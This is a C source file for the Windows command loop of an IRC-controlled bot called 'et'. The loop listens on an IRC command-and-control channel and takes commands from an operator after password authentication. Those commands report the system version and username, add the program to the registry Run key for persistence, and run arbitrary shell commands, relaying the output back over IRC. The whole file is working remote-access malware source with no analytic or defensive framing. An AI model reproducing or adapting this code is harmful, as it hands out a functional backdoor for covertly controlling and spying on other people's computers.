/*	et_main_loop_nix.c
	Author: William Woodruff
	------------------------
	The primary function used by et to send/receive data on Windows.
*/

#include "../cnc_info.h"
#include <string.h>
#include <stdio.h>
#include <windows.h>

/*	et_main_loop_win
	The main loop called by et_win.c to communicate with the IRC C&C server.
	arg: SOCKET socket, the winsock to write to/read from.
	arg: char *nick, the string containing the IRC nickname
*/
void et_main_loop_win(SOCKET socket, char *nick)
{
	char message[IRC_MSGLEN];
	char buf[1024];
	char auth = 0;

	while(1)
	{
		ZeroMemory(message, IRC_MSGLEN);
		ZeroMemory(buf, 1024);
		recv(socket, buf, 1023, 0);
		buf[1023] = '\0';

		char *ping;
		if ((ping = strstr(buf, "PING")) && !(strstr(buf, "CASEMAPPING")))
		{
			_snprintf(message, IRC_MSGLEN, "PONG :%s\r\n", IRC_SERVER);
			send(socket, message, strlen(message), 0);
		}
		else if (strstr(buf, "PRIVMSG") && strstr(buf, nick))
		{
			char *line = strtok(buf, "\r\n");
			char *cmd = strrchr(line, ':');
			cmd++; /* increment past ':' */

			if (strstr(cmd, "auth") && !(strstr(cmd, "deauth")))
			{
				cmd += 5; /* increment past 'auth ' */

				if (!strcmp(cmd, IRC_AUTH))
				{
					auth = 1;
					_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Successfully authorized. %s listening.\r\n", IRC_CHANNEL, nick);
					send(socket, message, strlen(message), 0);
				}
				else
				{
					_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Authorization failed, password incorrect.\r\n", IRC_CHANNEL);
					send(socket, message, strlen(message), 0);
				}
			}
			else
			{
				if (!auth)
				{
					_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Not authorized to command. Please auth.\r\n", IRC_CHANNEL);
					send(socket, message, strlen(message), 0);
				}
				else
				{
					if (!strcmp(cmd, "kill"))
					{
						break; /* back to main@et_win.c */
					}
					else if (!strcmp(cmd, "deauth"))
					{
						_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
						send(socket, message, strlen(message), 0);
						auth = 0;
					}
					else if (!strcmp(cmd, "info"))
					{
						char misc[128];
						DWORD misc_sz = 128;

						OSVERSIONINFO kern_info;
						kern_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
						GetVersionEx(&kern_info);
						_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Kernel: Windows NT %d.%d build %d\r\n", IRC_CHANNEL, (int) kern_info.dwMajorVersion, (int) kern_info.dwMinorVersion, (int) kern_info.dwBuildNumber);
						send(socket, message, strlen(message), 0);
						ZeroMemory(message, IRC_MSGLEN);

						GetUserName(misc, &misc_sz);
						_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Username: %s\r\n", IRC_CHANNEL, misc);
						send(socket, message, strlen(message), 0);
						ZeroMemory(message, IRC_MSGLEN);
						ZeroMemory(misc, misc_sz);
					}
					else if (strstr(cmd, "popup"))
					{
						cmd += 6; /* increment past 'popup ' */
						MessageBox(NULL, cmd, "ET", MB_OK | MB_ICONINFORMATION);
					}
					else if (!strcmp(cmd, "persist"))
					{
						HKEY key = NULL;
						RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &key, NULL);
						char path[256];
						GetModuleFileName(NULL, path, 256);
						RegSetValueEx(key, "et", 0, REG_SZ, (BYTE *) path, strlen(path));
						RegCloseKey(key);

						_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Persist succeeded.\r\n", IRC_CHANNEL);
						send(socket, message, strlen(message), 0);
					}
					else if (!(strcmp(cmd, "depersist")))
					{
						HKEY key = NULL;
						RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &key);
						
						RegDeleteValue(key, "et");
						RegDeleteKey(key, "et");
						RegCloseKey(key);
						_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Successfully removed registry key.\r\n", IRC_CHANNEL);

						send(socket, message, strlen(message), 0);
						ZeroMemory(message, IRC_MSGLEN);
					}
					else
					{
						char cmd_output[IRC_MSGLEN];
						FILE *output_file = _popen(cmd, "rt");
						fread((void *) cmd_output, 1, IRC_MSGLEN, output_file);

						int i;
						for (i = 0; cmd_output[i]; i++)
						{
							if (cmd_output[i] == '\r' || cmd_output[i] == '\n')
							{
								cmd_output[i] = ' ';
							}
						}

						if (strlen(cmd_output) >= 500)
						{
							_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :Command output too large to send.\r\n", IRC_CHANNEL);
						}
						else
						{
							_snprintf(message, IRC_MSGLEN, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
						}

						send(socket, message, strlen(message), 0);
						_pclose(output_file);
						ZeroMemory(cmd_output, IRC_MSGLEN);
					}
				}
			}
		}
	}
}